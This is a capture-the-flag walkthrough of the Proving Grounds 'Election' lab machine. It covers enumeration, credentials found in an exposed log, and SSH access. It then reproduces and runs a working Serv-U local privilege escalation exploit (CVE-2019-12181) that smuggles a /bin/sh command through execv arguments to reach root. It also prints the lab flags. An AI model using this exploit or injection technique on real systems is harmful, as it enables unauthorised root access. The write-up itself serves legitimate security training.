# Election - Proving Grounds Play

## Machine Info
- **Platform:** Offensive Security Proving Grounds (Play)
- **Difficulty:** Easy
- **IP Address:** 192.168.142.211
- **OS:** Ubuntu 18.04.4 LTS

## Objectives Completed
- Discover open services and perform enumeration using Nmap
- Use Gobuster to identify hidden directories on the web application
- Locate credentials in the logs directory and use them to log in via SSH
- Identify SUID binaries on the target and leverage an exploit for privilege escalation
- Transfer, compile, and execute an exploit to gain root access

## Summary
This machine runs an eLection web application with exposed log files containing admin credentials. After SSH access, privilege escalation is achieved via a vulnerable SUID Serv-U FTP Server binary (CVE-2019-12181).

---

## Reconnaissance

### Port Scanning

```bash
nmap -sC -sV -p- --min-rate=1000 192.168.142.211
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

**Key Findings:**
- SSH (22) - OpenSSH 7.6p1
- HTTP (80) - Apache 2.4.29 with default page

---

## Enumeration

### Web Enumeration

The homepage shows the default Apache2 Ubuntu page. Check `robots.txt` for hidden directories:

```bash
curl http://192.168.142.211/robots.txt
```

**Output:**
```
admin
wordpress
user
election
```

### Exploring /election/

```bash
curl http://192.168.142.211/election/
```

This reveals **eLection - Web Based Election System** by Tripath Projects. The application has:
- Candidate listing (showing user "Love")
- Voter's code input
- Admin panel at `/election/admin/`

### Admin Panel Discovery

```bash
curl http://192.168.142.211/election/admin/
```

Found admin login page requiring Admin ID and password.

### Finding the Logs Directory

After exploring `/election/admin/`, discovered an exposed logs directory:

```bash
curl http://192.168.142.211/election/admin/logs/
```

**Output:**
```
Index of /election/admin/logs
Name                    Last modified      Size  
system.log              2020-05-27 15:23  205
```

### Extracting Credentials

```bash
curl http://192.168.142.211/election/admin/logs/system.log
```

**Output:**
```
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
```

**Credentials Found:**
- **Username:** `love`
- **Password:** `P@$$w0rd@123`

---

## Initial Access

### SSH Login

```bash
ssh love@192.168.142.211
# Password: P@$$w0rd@123
```

**Successful login!**

```bash
id
uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
```

### Local Flag

```bash
cat /home/love/local.txt
da4de1aeb7060dd9ef64092fe904b4cb
```

---

## Privilege Escalation

### Finding SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Unusual SUID binary found:**
```
/usr/local/Serv-U/Serv-U
```

### Investigating Serv-U

```bash
ls -la /usr/local/Serv-U/
```

**Output:**
```
-rwsr-xr-x  1 root root 6319088 Nov 29  2017 Serv-U
```

The Serv-U binary is dated November 2017 and has the SUID bit set.

### Vulnerability Research

Serv-U FTP Server versions prior to 15.1.7 are vulnerable to **CVE-2019-12181** - a local privilege escalation vulnerability.

**Exploit:** https://www.exploit-db.com/exploits/47009

### Downloading the Exploit

On the attacker machine:

```bash
curl -s 'https://www.exploit-db.com/raw/47009' -o servu-pe.c
```

**Exploit Code (servu-pe.c):**
```c
/*
CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation 
vulnerability found by: Guy Levin (@va_start)
*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```

### Transferring to Target

```bash
scp servu-pe.c love@192.168.142.211:/tmp/
```

### Compiling the Exploit

On the target:

```bash
cd /tmp
gcc servu-pe.c -o pe
```

### Executing the Exploit

```bash
./pe
```

**Output:**
```
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell
```

**ROOT ACCESS ACHIEVED!**

### Root Flag

```bash
cat /root/proof.txt
44279d5efc7466e80c57a71e13f5b79c
```

---

## Flags

| Flag Type | Value |
|-----------|-------|
| local.txt | `da4de1aeb7060dd9ef64092fe904b4cb` |
| proof.txt | `44279d5efc7466e80c57a71e13f5b79c` |

---

## Key Takeaways

1. **Information Disclosure:** The exposed `/election/admin/logs/system.log` file contained plaintext credentials - always secure log files
2. **SUID Binary Analysis:** Always enumerate SUID binaries; non-standard ones like Serv-U may have known vulnerabilities
3. **CVE Research:** The Serv-U version from 2017 was vulnerable to CVE-2019-12181, allowing privilege escalation
4. **robots.txt:** Simple but effective for finding hidden directories

---

## Tools Used

- nmap
- curl
- ssh/scp
- gcc
- searchsploit/exploit-db

---

## References

- [CVE-2019-12181 - Serv-U FTP Server Privilege Escalation](https://nvd.nist.gov/vuln/detail/CVE-2019-12181)
- [Exploit-DB 47009](https://www.exploit-db.com/exploits/47009)
- [eLection - Web Based Election System](https://github.com/fauzantrif/eLection)
